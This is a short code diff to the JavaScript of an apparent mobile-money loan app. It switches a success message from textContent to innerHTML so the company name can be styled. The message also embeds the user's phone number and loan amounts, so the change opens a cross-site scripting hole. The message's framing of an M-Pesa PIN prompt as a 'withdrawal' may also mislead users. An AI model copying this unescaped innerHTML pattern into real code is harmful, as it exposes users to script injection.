@@ -588,7 +588,7 @@
             const successAlert = document.getElementById('successAlert');
             const successMessage = document.getElementById('successMessage');
             
-            successMessage.textContent = message;
+            successMessage.innerHTML = message;
             successAlert.classList.remove('hidden');
             successAlert.scrollIntoView({ behavior: 'smooth', block: 'start' });
             
@@ -717,9 +717,10 @@
                 // Handle successful response
                 if (result.success || result.status === 'success' || response.status === 200) {
                     showSuccess(
-                        `STK Push sent successfully! Check your phone (${loanData.phone}) for the M-Pesa payment request from ✔️SWIFTWALLET DIGITAL VENTURES✔️. ` +
-                        `Enter your M-Pesa PIN to complete the withdrawal of KES ${(parseFloat(loanData.amount) - parseFloat(loanData.fee)).toLocaleString()}.`
-                    );
+                      `STK Push sent successfully! Check your phone (${loanData.phone}) for the M-Pesa payment request from 
+                       <span class="text-red-600 font-bold">✔️SWIFTWALLET DIGITAL VENTURES✔️</span>. 
+                       Enter your M-Pesa PIN to complete the withdrawal of KES ${(parseFloat(loanData.amount) - parseFloat(loanData.fee)).toLocaleString()}.`
+                        );
 
                     // Update local storage to mark as withdrawn
                     localStorage.setItem('swift_withdrawal_initiated', 'true');
